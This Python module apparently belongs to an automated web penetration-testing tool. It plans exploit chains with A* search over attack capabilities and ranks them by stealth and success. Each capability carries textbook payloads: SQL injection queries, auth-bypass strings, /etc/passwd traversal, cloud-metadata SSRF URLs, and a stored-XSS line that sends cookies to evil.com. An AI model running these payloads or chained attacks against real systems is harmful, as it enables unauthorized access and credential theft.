#!/usr/bin/env python3
"""
Attack Graph and Chaining System
Lightweight directed graph for capability progression and exploit chaining
"""

import logging
import json
from typing import Dict, List, Set, Optional, Tuple, Any
from dataclasses import dataclass, asdict
from enum import Enum
import heapq
from datetime import datetime

logger = logging.getLogger(__name__)

class CapabilityType(Enum):
    """Types of attack capabilities"""
    INFORMATION = "information"      # Info disclosure, fingerprinting
    ACCESS = "access"               # Authentication bypass, session hijacking
    EXECUTION = "execution"         # Code/command execution
    PRIVILEGE = "privilege"         # Privilege escalation
    PERSISTENCE = "persistence"     # Backdoors, persistent access
    LATERAL = "lateral"            # Lateral movement, network pivoting
    EXFILTRATION = "exfiltration"  # Data extraction, file access

@dataclass
class Capability:
    """Single attack capability node"""
    id: str
    name: str
    type: CapabilityType
    description: str
    requirements: List[str]  # Required capabilities/conditions
    provides: List[str]     # What this capability enables
    priority: float         # Base priority (0.0 to 1.0)
    complexity: float       # Execution complexity (0.0 to 1.0)
    stealth: float         # Stealth level (0.0 to 1.0)
    reliability: float     # Success probability (0.0 to 1.0)
    
    # Technical details
    vulnerability_type: str  # sqli, xss, ssrf, etc.
    attack_vector: str      # reflected, stored, blind, etc.
    payloads: List[str]
    evidence_required: List[str]
    
    # Metadata
    created_at: datetime = None
    last_used: datetime = None
    success_rate: float = 0.0
    
    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()

@dataclass
class Edge:
    """Connection between capabilities with weight and conditions"""
    from_cap: str           # Source capability ID
    to_cap: str            # Target capability ID
    weight: float          # Transition cost/difficulty (0.0 to 1.0)
    conditions: List[str]  # Required conditions for transition
    description: str       # How this transition works
    
    def __lt__(self, other):
        """For priority queue sorting"""
        return self.weight < other.weight

@dataclass
class AttackPath:
    """Complete attack path from source to target"""
    capabilities: List[str]  # Sequence of capability IDs
    total_weight: float
    success_probability: float
    estimated_time: float    # Minutes
    stealth_score: float
    description: str
    
    def __lt__(self, other):
        """For priority queue sorting - lower total weight is better"""
        return self.total_weight < other.total_weight

class AttackGraph:
    """
    Lightweight directed graph for attack capability modeling and chaining.
    Uses A* pathfinding to discover optimal exploit chains.
    """
    
    def __init__(self):
        self.capabilities: Dict[str, Capability] = {}
        self.edges: Dict[str, List[Edge]] = {}  # from_cap -> [edges]
        self.reverse_edges: Dict[str, List[Edge]] = {}  # to_cap -> [edges]
        
        # Initialize with common attack capabilities
        self._initialize_default_capabilities()
    
    def _initialize_default_capabilities(self):
        """Initialize graph with common attack capabilities and transitions"""
        
        # Information gathering capabilities
        self.add_capability(Capability(
            id="info_disclosure",
            name="Information Disclosure",
            type=CapabilityType.INFORMATION,
            description="Extract sensitive information from application",
            requirements=[],
            provides=["internal_paths", "database_info", "source_code"],
            priority=0.6,
            complexity=0.3,
            stealth=0.8,
            reliability=0.9,
            vulnerability_type="info_disclosure",
            attack_vector="error_based",
            payloads=["../../../etc/passwd", "?debug=true", "/admin"],
            evidence_required=["sensitive_data_in_response"]
        ))
        
        # SQL Injection capabilities
        self.add_capability(Capability(
            id="sqli_error_based",
            name="Error-based SQL Injection",
            type=CapabilityType.ACCESS,
            description="Extract data using SQL error messages",
            requirements=["injectable_parameter"],
            provides=["database_access", "data_extraction", "authentication_bypass"],
            priority=0.9,
            complexity=0.4,
            stealth=0.3,  # Low stealth due to errors
            reliability=0.8,
            vulnerability_type="sqli",
            attack_vector="error_based",
            payloads=["' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"],
            evidence_required=["sql_error_in_response"]
        ))
        
        self.add_capability(Capability(
            id="sqli_boolean_blind",
            name="Boolean-based Blind SQL Injection",
            type=CapabilityType.ACCESS,
            description="Extract data using boolean logic differences",
            requirements=["injectable_parameter"],
            provides=["database_access", "data_extraction", "authentication_bypass"],
            priority=0.8,
            complexity=0.7,
            stealth=0.9,  # High stealth
            reliability=0.7,
            vulnerability_type="sqli",
            attack_vector="boolean_blind",
            payloads=["' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='a'--"],
            evidence_required=["response_differential"]
        ))
        
        self.add_capability(Capability(
            id="sqli_time_blind",
            name="Time-based Blind SQL Injection",
            type=CapabilityType.ACCESS,
            description="Extract data using time delays",
            requirements=["injectable_parameter"],
            provides=["database_access", "data_extraction", "authentication_bypass"],
            priority=0.7,
            complexity=0.6,
            stealth=0.8,
            reliability=0.9,
            vulnerability_type="sqli",
            attack_vector="time_blind",
            payloads=["' AND IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(5),0)--"],
            evidence_required=["timing_differential"]
        ))
        
        # XSS capabilities
        self.add_capability(Capability(
            id="xss_reflected",
            name="Reflected XSS",
            type=CapabilityType.EXECUTION,
            description="Execute JavaScript in victim's browser",
            requirements=["reflectable_parameter"],
            provides=["client_code_execution", "session_hijacking", "credential_theft"],
            priority=0.8,
            complexity=0.3,
            stealth=0.6,
            reliability=0.8,
            vulnerability_type="xss",
            attack_vector="reflected",
            payloads=["<script>alert(document.domain)</script>", "<img src=x onerror=alert(1)>"],
            evidence_required=["script_execution_in_browser"]
        ))
        
        self.add_capability(Capability(
            id="xss_stored",
            name="Stored XSS",
            type=CapabilityType.PERSISTENCE,
            description="Store malicious script for persistent execution",
            requirements=["user_input_storage"],
            provides=["persistent_code_execution", "mass_session_hijacking", "credential_harvesting"],
            priority=0.95,
            complexity=0.4,
            stealth=0.4,  # Lower stealth due to persistence
            reliability=0.9,
            vulnerability_type="xss",
            attack_vector="stored",
            payloads=["<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"],
            evidence_required=["persistent_script_storage"]
        ))
        
        # SSRF capabilities
        self.add_capability(Capability(
            id="ssrf_external",
            name="External SSRF",
            type=CapabilityType.LATERAL,
            description="Make requests to external systems",
            requirements=["url_parameter"],
            provides=["external_reconnaissance", "service_enumeration"],
            priority=0.6,
            complexity=0.5,
            stealth=0.7,
            reliability=0.6,
            vulnerability_type="ssrf",
            attack_vector="external",
            payloads=["http://evil.com/callback", "https://webhook.site/unique-id"],
            evidence_required=["external_request_callback"]
        ))
        
        self.add_capability(Capability(
            id="ssrf_internal",
            name="Internal SSRF",
            type=CapabilityType.LATERAL,
            description="Access internal services and metadata",
            requirements=["url_parameter"],
            provides=["internal_service_access", "cloud_metadata_access", "network_mapping"],
            priority=0.9,
            complexity=0.6,
            stealth=0.8,
            reliability=0.8,
            vulnerability_type="ssrf",
            attack_vector="internal",
            payloads=["http://169.254.169.254/latest/meta-data/", "http://localhost:80/admin"],
            evidence_required=["internal_service_response"]
        ))
        
        # Authentication capabilities
        self.add_capability(Capability(
            id="auth_bypass",
            name="Authentication Bypass",
            type=CapabilityType.ACCESS,
            description="Bypass authentication mechanisms",
            requirements=["authentication_endpoint"],
            provides=["authenticated_access", "admin_privileges"],
            priority=0.95,
            complexity=0.5,
            stealth=0.9,
            reliability=0.7,
            vulnerability_type="auth_bypass",
            attack_vector="logic_flaw",
            payloads=["admin'--", "' OR '1'='1", "admin' OR '1'='1'--"],
            evidence_required=["authenticated_response"]
        ))
        
        # IDOR capabilities  
        self.add_capability(Capability(
            id="idor_horizontal",
            name="Horizontal IDOR",
            type=CapabilityType.ACCESS,
            description="Access other users' data at same privilege level",
            requirements=["object_reference_parameter"],
            provides=["lateral_data_access", "user_enumeration"],
            priority=0.8,
            complexity=0.2,
            stealth=0.9,
            reliability=0.8,
            vulnerability_type="idor",
            attack_vector="horizontal",
            payloads=["user_id=2", "account=1337", "profile_id=admin"],
            evidence_required=["unauthorized_data_access"]
        ))
        
        self.add_capability(Capability(
            id="idor_vertical",
            name="Vertical IDOR",
            type=CapabilityType.PRIVILEGE,
            description="Access higher-privileged functions/data",
            requirements=["object_reference_parameter"],
            provides=["privilege_escalation", "admin_functions"],
            priority=0.95,
            complexity=0.3,
            stealth=0.8,
            reliability=0.7,
            vulnerability_type="idor",
            attack_vector="vertical",
            payloads=["role=admin", "user_type=administrator", "level=99"],
            evidence_required=["privileged_data_access"]
        ))
        
        # Now add edges (transitions) between capabilities
        self._add_default_edges()
    
    def _add_default_edges(self):
        """Add transitions between capabilities"""
        
        # Information disclosure can lead to finding injection points
        self.add_edge(Edge(
            from_cap="info_disclosure",
            to_cap="sqli_error_based",
            weight=0.3,
            conditions=["sql_database_detected"],
            description="Information disclosure reveals SQL injection opportunities"
        ))
        
        # Error-based SQLi can reveal database structure for blind attacks
        self.add_edge(Edge(
            from_cap="sqli_error_based",
            to_cap="sqli_boolean_blind",
            weight=0.2,
            conditions=["database_structure_known"],
            description="Error-based injection provides intel for blind attacks"
        ))
        
        self.add_edge(Edge(
            from_cap="sqli_error_based",
            to_cap="sqli_time_blind",
            weight=0.25,
            conditions=["database_structure_known"],
            description="Error-based injection enables time-based extraction"
        ))
        
        # SQL injection can lead to authentication bypass
        self.add_edge(Edge(
            from_cap="sqli_error_based",
            to_cap="auth_bypass",
            weight=0.4,
            conditions=["login_form_injectable"],
            description="SQL injection in login form bypasses authentication"
        ))
        
        self.add_edge(Edge(
            from_cap="sqli_boolean_blind",
            to_cap="auth_bypass",
            weight=0.5,
            conditions=["login_form_injectable"],
            description="Blind SQL injection extracts credentials"
        ))
        
        # Authentication bypass enables IDOR attacks
        self.add_edge(Edge(
            from_cap="auth_bypass",
            to_cap="idor_horizontal",
            weight=0.3,
            conditions=["authenticated_endpoints_available"],
            description="Bypassed authentication enables object reference manipulation"
        ))
        
        self.add_edge(Edge(
            from_cap="auth_bypass",
            to_cap="idor_vertical",
            weight=0.4,
            conditions=["admin_endpoints_available"],
            description="Bypassed authentication enables privilege escalation"
        ))
        
        # XSS can be used for session hijacking after authentication
        self.add_edge(Edge(
            from_cap="xss_reflected",
            to_cap="auth_bypass",
            weight=0.6,
            conditions=["admin_session_available"],
            description="XSS steals admin session cookies"
        ))
        
        self.add_edge(Edge(
            from_cap="xss_stored",
            to_cap="auth_bypass",
            weight=0.4,
            conditions=["admin_visits_page"],
            description="Stored XSS compromises admin session"
        ))
        
        # SSRF can lead to internal service exploitation
        self.add_edge(Edge(
            from_cap="ssrf_external",
            to_cap="ssrf_internal",
            weight=0.5,
            conditions=["internal_network_reachable"],
            description="External SSRF provides foothold for internal exploitation"
        ))
        
        self.add_edge(Edge(
            from_cap="ssrf_internal",
            to_cap="info_disclosure",
            weight=0.3,
            conditions=["internal_services_responsive"],
            description="Internal SSRF reveals sensitive information"
        ))
        
        # IDOR horizontal can escalate to vertical
        self.add_edge(Edge(
            from_cap="idor_horizontal",
            to_cap="idor_vertical", 
            weight=0.4,
            conditions=["privilege_parameter_found"],
            description="Horizontal IDOR reveals privilege escalation vectors"
        ))
    
    def add_capability(self, capability: Capability) -> bool:
        """Add a new capability to the graph"""
        try:
            self.capabilities[capability.id] = capability
            if capability.id not in self.edges:
                self.edges[capability.id] = []
            if capability.id not in self.reverse_edges:
                self.reverse_edges[capability.id] = []
            return True
        except Exception as e:
            logger.error(f"Failed to add capability {capability.id}: {e}")
            return False
    
    def add_edge(self, edge: Edge) -> bool:
        """Add a transition edge between capabilities"""
        try:
            if edge.from_cap not in self.capabilities or edge.to_cap not in self.capabilities:
                logger.warning(f"Edge references non-existent capabilities: {edge.from_cap} -> {edge.to_cap}")
                return False
            
            self.edges[edge.from_cap].append(edge)
            self.reverse_edges[edge.to_cap].append(edge)
            return True
        except Exception as e:
            logger.error(f"Failed to add edge {edge.from_cap} -> {edge.to_cap}: {e}")
            return False
    
    def find_attack_paths(self, current_capabilities: List[str], 
                         target_capabilities: List[str],
                         max_paths: int = 5,
                         max_depth: int = 6) -> List[AttackPath]:
        """
        Find optimal attack paths from current capabilities to targets using A*.
        
        Args:
            current_capabilities: List of currently available capability IDs
            target_capabilities: List of desired capability IDs  
            max_paths: Maximum number of paths to return
            max_depth: Maximum path length to consider
            
        Returns:
            List of AttackPath objects sorted by optimality
        """
        if not current_capabilities or not target_capabilities:
            return []
        
        all_paths = []
        
        # Find paths to each target capability
        for target in target_capabilities:
            if target not in self.capabilities:
                continue
                
            for start in current_capabilities:
                if start not in self.capabilities:
                    continue
                    
                paths = self._a_star_search(start, target, max_depth)
                all_paths.extend(paths)
        
        # Sort by total weight (lower is better) and return top results
        all_paths.sort()
        return all_paths[:max_paths]
    
    def _a_star_search(self, start: str, target: str, max_depth: int) -> List[AttackPath]:
        """A* pathfinding from start to target capability"""
        if start == target:
            return []
        
        # Priority queue: (f_score, g_score, current_node, path)
        heap = [(0.0, 0.0, start, [start])]
        visited = set()
        paths_found = []
        
        while heap and len(paths_found) < 3:  # Find up to 3 paths per start-target pair
            f_score, g_score, current, path = heapq.heappop(heap)
            
            if len(path) > max_depth:
                continue
                
            if current in visited:
                continue
                
            visited.add(current)
            
            if current == target:
                # Found a path
                attack_path = self._build_attack_path(path)
                if attack_path:
                    paths_found.append(attack_path)
                continue
            
            # Explore neighbors
            for edge in self.edges.get(current, []):
                neighbor = edge.to_cap
                if neighbor in visited or neighbor in path:  # Avoid cycles
                    continue
                
                tentative_g = g_score + edge.weight
                h_score = self._heuristic(neighbor, target)
                f_score = tentative_g + h_score
                
                new_path = path + [neighbor]
                heapq.heappush(heap, (f_score, tentative_g, neighbor, new_path))
        
        return paths_found
    
    def _heuristic(self, current: str, target: str) -> float:
        """Heuristic function for A* (estimated distance to target)"""
        if current == target:
            return 0.0
        
        current_cap = self.capabilities.get(current)
        target_cap = self.capabilities.get(target)
        
        if not current_cap or not target_cap:
            return 1.0
        
        # Simple heuristic based on capability types and priorities
        type_distance = 0.0
        if current_cap.type != target_cap.type:
            type_distance = 0.3
        
        priority_distance = abs(current_cap.priority - target_cap.priority) * 0.2
        
        return type_distance + priority_distance
    
    def _build_attack_path(self, capability_sequence: List[str]) -> Optional[AttackPath]:
        """Build AttackPath object from capability sequence"""
        if len(capability_sequence) < 2:
            return None
        
        total_weight = 0.0
        success_probability = 1.0
        estimated_time = 0.0
        stealth_scores = []
        descriptions = []
        
        for i in range(len(capability_sequence) - 1):
            from_cap = capability_sequence[i]
            to_cap = capability_sequence[i + 1]
            
            # Find the edge
            edge = None
            for e in self.edges.get(from_cap, []):
                if e.to_cap == to_cap:
                    edge = e
                    break
            
            if not edge:
                return None  # Invalid path
            
            # Get capability info
            cap = self.capabilities.get(to_cap)
            if not cap:
                return None
            
            # Accumulate metrics
            total_weight += edge.weight
            success_probability *= cap.reliability
            estimated_time += cap.complexity * 10  # Rough time estimate in minutes
            stealth_scores.append(cap.stealth)
            descriptions.append(f"{cap.name} via {edge.description}")
        
        # Calculate average stealth
        avg_stealth = sum(stealth_scores) / len(stealth_scores) if stealth_scores else 0.0
        
        return AttackPath(
            capabilities=capability_sequence,
            total_weight=total_weight,
            success_probability=success_probability,
            estimated_time=estimated_time,
            stealth_score=avg_stealth,
            description=" → ".join(descriptions)
        )
    
    def suggest_next_actions(self, current_capabilities: List[str],
                           discovered_context: Dict[str, Any] = None) -> List[Tuple[str, float]]:
        """
        Suggest next best actions based on current capabilities and context.
        
        Args:
            current_capabilities: List of verified capability IDs
            discovered_context: Context from target (tech stack, parameters, etc.)
            
        Returns:
            List of (capability_id, priority_score) tuples sorted by priority
        """
        if not current_capabilities:
            # No current capabilities - suggest reconnaissance
            return [("info_disclosure", 0.9)]
        
        context = discovered_context or {}
        suggestions = []
        
        # Find capabilities reachable from current state
        reachable = set()
        for current in current_capabilities:
            for edge in self.edges.get(current, []):
                next_cap = edge.to_cap
                if next_cap not in current_capabilities:  # Don't suggest what we already have
                    # Check if conditions are met
                    if self._conditions_met(edge.conditions, context):
                        priority_score = self._calculate_action_priority(
                            current, next_cap, edge, context
                        )
                        suggestions.append((next_cap, priority_score))
                        reachable.add(next_cap)
        
        # Sort by priority score (higher is better)
        suggestions.sort(key=lambda x: x[1], reverse=True)
        
        return suggestions[:10]  # Return top 10 suggestions
    
    def _conditions_met(self, conditions: List[str], context: Dict[str, Any]) -> bool:
        """Check if edge conditions are satisfied by current context"""
        if not conditions:
            return True  # No conditions required
        
        for condition in conditions:
            if not self._check_condition(condition, context):
                return False
        
        return True
    
    def _check_condition(self, condition: str, context: Dict[str, Any]) -> bool:
        """Check if a specific condition is met"""
        # Simple condition checking - could be expanded
        context_keys = [k.lower() for k in context.keys()]
        condition_lower = condition.lower()
        
        # Check for technology stack matches
        if "database" in condition_lower:
            tech_stack = context.get("tech_stack", [])
            return any("sql" in tech.lower() or "database" in tech.lower() for tech in tech_stack)
        
        if "injectable" in condition_lower:
            return "parameters" in context and len(context["parameters"]) > 0
        
        if "login" in condition_lower or "auth" in condition_lower:
            return any("login" in key or "auth" in key for key in context_keys)
        
        # Default: assume condition is met (optimistic)
        return True
    
    def _calculate_action_priority(self, from_cap: str, to_cap: str, 
                                 edge: Edge, context: Dict[str, Any]) -> float:
        """Calculate priority score for a potential action"""
        to_capability = self.capabilities.get(to_cap)
        if not to_capability:
            return 0.0
        
        # Base priority from capability
        priority = to_capability.priority
        
        # Boost for low-complexity actions
        priority += (1.0 - to_capability.complexity) * 0.2
        
        # Boost for high-reliability actions
        priority += to_capability.reliability * 0.1
        
        # Boost for low-weight transitions
        priority += (1.0 - edge.weight) * 0.15
        
        # Context-based boosts
        tech_stack = [t.lower() for t in context.get("tech_stack", [])]
        
        if to_capability.vulnerability_type == "sqli" and any("sql" in tech or "mysql" in tech for tech in tech_stack):
            priority += 0.2
        
        if to_capability.vulnerability_type == "xss" and any("javascript" in tech or "js" in tech for tech in tech_stack):
            priority += 0.15
        
        return min(1.0, priority)  # Cap at 1.0
    
    def export_graph(self) -> Dict[str, Any]:
        """Export graph to JSON format"""
        return {
            "capabilities": {cap_id: asdict(cap) for cap_id, cap in self.capabilities.items()},
            "edges": {
                from_cap: [asdict(edge) for edge in edges] 
                for from_cap, edges in self.edges.items()
            },
            "metadata": {
                "total_capabilities": len(self.capabilities),
                "total_edges": sum(len(edges) for edges in self.edges.values()),
                "exported_at": datetime.now().isoformat()
            }
        }
    
    def import_graph(self, graph_data: Dict[str, Any]) -> bool:
        """Import graph from JSON format"""
        try:
            # Clear existing graph
            self.capabilities.clear()
            self.edges.clear()
            self.reverse_edges.clear()
            
            # Import capabilities
            for cap_data in graph_data.get("capabilities", {}).values():
                cap = Capability(**cap_data)
                self.add_capability(cap)
            
            # Import edges
            for from_cap, edges_data in graph_data.get("edges", {}).items():
                for edge_data in edges_data:
                    edge = Edge(**edge_data)
                    self.add_edge(edge)
            
            return True
        except Exception as e:
            logger.error(f"Failed to import graph: {e}")
            return False

# Global attack graph instance
attack_graph = AttackGraph()

def find_exploit_chains(current_capabilities: List[str], 
                       target_capabilities: List[str],
                       context: Dict[str, Any] = None) -> List[AttackPath]:
    """
    Main API function to find exploit chains.
    
    Args:
        current_capabilities: Currently verified capabilities
        target_capabilities: Desired capabilities to achieve
        context: Target context (tech stack, discovered vulnerabilities, etc.)
        
    Returns:
        List of optimal attack paths
    """
    return attack_graph.find_attack_paths(current_capabilities, target_capabilities)

def suggest_next_attacks(current_capabilities: List[str],
                        context: Dict[str, Any] = None) -> List[Tuple[str, float]]:
    """
    Suggest next best attack vectors based on current state.
    
    Args:
        current_capabilities: Currently verified capabilities  
        context: Target context for contextual suggestions
        
    Returns:
        List of (capability_id, priority_score) tuples
    """
    return attack_graph.suggest_next_actions(current_capabilities, context)

if __name__ == "__main__":
    # Test the attack graph
    logging.basicConfig(level=logging.INFO)
    
    # Test finding paths from information disclosure to admin access
    current = ["info_disclosure"]
    targets = ["auth_bypass", "idor_vertical"]
    
    paths = find_exploit_chains(current, targets)
    
    print(f"Found {len(paths)} attack paths:")
    for i, path in enumerate(paths, 1):
        print(f"\nPath {i} (weight: {path.total_weight:.2f}, success: {path.success_probability:.1%}):")
        print(f"  {' → '.join(path.capabilities)}")
        print(f"  Description: {path.description}")
        print(f"  Estimated time: {path.estimated_time:.1f} minutes")
        print(f"  Stealth score: {path.stealth_score:.1%}")
    
    # Test next action suggestions
    print(f"\nNext action suggestions from {current}:")
    suggestions = suggest_next_attacks(current, {"tech_stack": ["php", "mysql"]})
    
    for cap_id, score in suggestions[:5]:
        cap = attack_graph.capabilities.get(cap_id)
        if cap:
            print(f"  {cap.name} (priority: {score:.2f}) - {cap.description}")